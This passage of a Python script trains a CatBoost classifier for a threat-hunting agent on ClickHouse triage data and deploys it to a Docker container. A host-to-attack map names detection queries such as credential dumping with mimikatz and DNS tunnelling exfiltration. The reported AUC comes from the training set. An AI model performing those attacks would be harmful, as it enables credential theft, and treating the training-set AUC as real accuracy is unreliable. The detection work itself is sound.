    # Temporal context (per-host score history)
    host_scores: Dict[str, List[float]] = {}
    host_actions: Dict[str, List[str]] = {}
    host_source_types: Dict[str, set] = {}
    for row in triage_rows:
        h = row["hostname"]
        host_scores.setdefault(h, []).append(float(row.get("adjusted_score", "0")))
        host_actions.setdefault(h, []).append(row.get("action", ""))
        host_source_types.setdefault(h, set()).add(row.get("source_type", ""))

    temporal_ctxs = {}
    for h, scores in host_scores.items():
        esc_count = sum(1 for a in host_actions.get(h, []) if a == "escalate")
        cats = len(host_source_types.get(h, set()))
        # Tactic diversity: how many different MITRE tactics seen for this host
        tactics = set()
        for row in triage_rows:
            if row["hostname"] == h:
                t = row.get("mitre_tactic", "").strip()
                if t:
                    tactics.add(t)
        temporal_ctxs[h] = {
            "escalation_count": esc_count,
            "unique_categories": cats,
            "tactic_diversity": len(tactics),
            "mean_score": sum(scores) / len(scores),
        }
    print(f"  Temporal context: {len(temporal_ctxs)} hosts")

    # Similarity context from real LanceDB
    print(f"\n[5/7] Querying LanceDB for real similarity distances...")
    sim_ctxs = {}
    for h in set(r["hostname"] for r in triage_rows):
        # Use host-specific attack description for more relevant similarity
        desc_map = {
            "db-srv-01": "SQL injection database exfiltration",
            "ws-finance-03": "credential dumping mimikatz",
            "dc-primary": "lateral movement domain controller",
            "rdp-gateway": "brute force RDP login",
            "dns-srv-01": "DNS tunneling exfiltration",
            "edge-router": "covert channel C2 beaconing",
            "internal-cache": "data exfiltration port abuse",
            "bastion-01": "SSH pivot lateral movement",
            "k8s-worker-07": "container escape privilege escalation",
        }
        desc = desc_map.get(h, h)
        sim_ctxs[h] = query_lancedb(h, desc)
        d = sim_ctxs[h]["attack_embed_dist"]
        n = sim_ctxs[h]["confirmed_neighbor_count"]
        print(f"  {h:22s} attack_dist={d:.3f} neighbors={n} "
              f"log_matches={sim_ctxs[h]['log_embed_matches']}")

    # ── Step 6: Build feature vectors + labels from REAL data ──────────
    print(f"\n[6/7] Building real feature vectors + ground-truth labels...")
    training_data: List[Tuple[List[float], int, str]] = []

    for row in triage_rows:
        h = row["hostname"]
        label = label_row(row)
        fv = build_feature_vector(
            row,
            network_ctx=net_ctx.get(h, {}),
            temporal_ctx=temporal_ctxs.get(h, {}),
            similarity_ctx=sim_ctxs.get(h, {}),
        )
        training_data.append((fv, label, h))

    positives = sum(1 for _, l, _ in training_data if l == 1)
    negatives = sum(1 for _, l, _ in training_data if l == 0)
    print(f"  Real training data: {len(training_data)} rows "
          f"({positives} attacks, {negatives} benign)")
    print(f"  NO synthetic data, NO augmentation")

    if len(training_data) < 50:
        print("ERROR: Not enough real data. Need at least 50 rows.")
        sys.exit(1)

    # ── Step 7: Write to CH + Train CatBoost ───────────────────────────
    print(f"\n[7/7] Writing {len(training_data)} REAL training rows to ClickHouse...")

    ch_command("TRUNCATE TABLE IF EXISTS clif_logs.hunter_training_data")

    written = 0
    batch_size = 50
    for batch_start in range(0, len(training_data), batch_size):
        batch = training_data[batch_start : batch_start + batch_size]
        value_rows = []
        for fv, label, hostname in batch:
            fv_json = json.dumps(fv)
            alert_id = str(uuid.uuid4())
            label_source = "real_attack" if label == 1 else "real_benign"
            finding = "CONFIRMED_ATTACK" if label == 1 else "NORMAL_BEHAVIOUR"
            value_rows.append(
                f"('{alert_id}', '{fv_json}', {label}, '{label_source}', "
                f"0.0, '{finding}', 0)"
            )
        values_str = ", ".join(value_rows)
        sql = (
            "INSERT INTO clif_logs.hunter_training_data "
            "(alert_id, feature_vector_json, label, label_source, "
            "hunter_score, finding_type, is_fast_path) VALUES " + values_str
        )
        if ch_command(sql):
            written += len(batch)
            print(f"  Batch {batch_start//batch_size + 1}: wrote {len(batch)} rows")
        else:
            print(f"  Batch {batch_start//batch_size + 1}: FAILED")

    print(f"  Written: {written}/{len(training_data)} (ALL REAL)")

    count = ch_query("SELECT count() FROM clif_logs.hunter_training_data FORMAT TabSeparated")
    print(f"  Verified: {count} rows")

    # ── Train CatBoost ─────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("TRAINING CATBOOST — REAL DATA ONLY")
    print("=" * 70)

    try:
        import numpy as np
        from catboost import CatBoostClassifier, Pool
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "catboost", "numpy"], check=True)
        import numpy as np
        from catboost import CatBoostClassifier, Pool

    X = np.array([fv for fv, _, _ in training_data], dtype=np.float32)
    y = np.array([l for _, l, _ in training_data], dtype=np.int32)

    print(f"  X shape: {X.shape}, y shape: {y.shape}")
    print(f"  y distribution: {sum(y==1)} attacks, {sum(y==0)} benign")
    print(f"  Data source: 100% real (zero synthetic)")

    # Use more regularization since dataset is small
    model = CatBoostClassifier(
        iterations=300,
        learning_rate=0.03,
        depth=4,          # shallower to avoid overfitting on small data
        loss_function="Logloss",
        eval_metric="AUC",
        random_seed=42,
        verbose=50,
        class_weights=[1, max(1, int(sum(y == 0) / max(sum(y == 1), 1)))],
        l2_leaf_reg=5,    # stronger regularization
        border_count=64,
        min_data_in_leaf=3,
        bagging_temperature=1,
    )

    train_pool = Pool(X, y)
    model.fit(train_pool)

    model_path = os.path.join(os.path.dirname(__file__), "hunter_catboost.cbm")
    model.save_model(model_path)
    print(f"\n  Model saved to: {model_path}")

    # Evaluation (on training set — we accept overfitting risk since ALL data is real)
    from sklearn.metrics import classification_report, roc_auc_score
    proba = model.predict_proba(X)
    y_pred = (proba[:, 1] >= 0.5).astype(int)
    auc = roc_auc_score(y, proba[:, 1])
    print(f"\n  Training AUC: {auc:.4f}")
    print(f"\n  Classification Report:")
    print(classification_report(y, y_pred, target_names=["BENIGN", "ATTACK"]))

    # Feature importances
    importances = model.get_feature_importance()
    FEATURE_NAMES = [
        "adjusted_score", "base_score", "entity_risk", "ioc_boost",
        "temporal_boost", "destination_risk", "off_hours_boost",
        "high_severity_count", "medium_severity_count", "distinct_categories",
        "event_count", "correlated_alert_count", "template_risk",
        "graph_unique_destinations", "graph_unique_src_ips", "graph_has_ioc_neighbor",
        "graph_hop_count", "graph_high_risk_neighbors", "graph_escalation_count",
        "graph_lateral_movement_score", "graph_c2_candidate_score",
        "temporal_escalation_count", "temporal_unique_categories",
        "temporal_tactic_diversity", "temporal_mean_score",
        "similarity_attack_embed_dist", "similarity_historical_dist",
        "similarity_log_embed_matches", "similarity_confirmed_neighbor_count",
        "similarity_min_confirmed_dist", "similarity_false_positive_count",
        "similarity_label_confidence",
        "mitre_match_count", "mitre_tactic_breadth",
        "campaign_host_count", "campaign_tactic_count",
        "sigma_hit_count", "sigma_max_severity",
        "spc_z_score", "spc_is_anomaly", "spc_baseline_mean", "spc_baseline_stddev",
    ]

    top_features = sorted(
        zip(FEATURE_NAMES, importances), key=lambda x: x[1], reverse=True
    )[:10]
    print("\n  Top 10 Feature Importances:")
    for fname, imp in top_features:
        print(f"    {fname:40s} {imp:6.2f}")

    # Deploy to container
    print(f"\n  Copying model to hunter container...")
    subprocess.run(
        ["docker", "cp", model_path, "clif-hunter-agent:/app/models/hunter_catboost.cbm"],
        check=True,
    )
    print("  Model copied!")

    print("  Restarting hunter agent...")
    subprocess.run(
        ["docker", "compose", "-f", "docker-compose-light.yml", "restart", "clif-hunter-agent"],
        check=True,
    )

    print("\n" + "=" * 70)
    print("BOOTSTRAP COMPLETE — REAL DATA ONLY")
    print(f"  Training samples: {len(training_data)} (ALL real, zero synthetic)")
    print(f"  Labels: {positives} real attacks / {negatives} real benign")
    print(f"  AUC: {auc:.4f}")
    print(f"  Model deployed to hunter container")
    print("=" * 70)


if __name__ == "__main__":
    main()
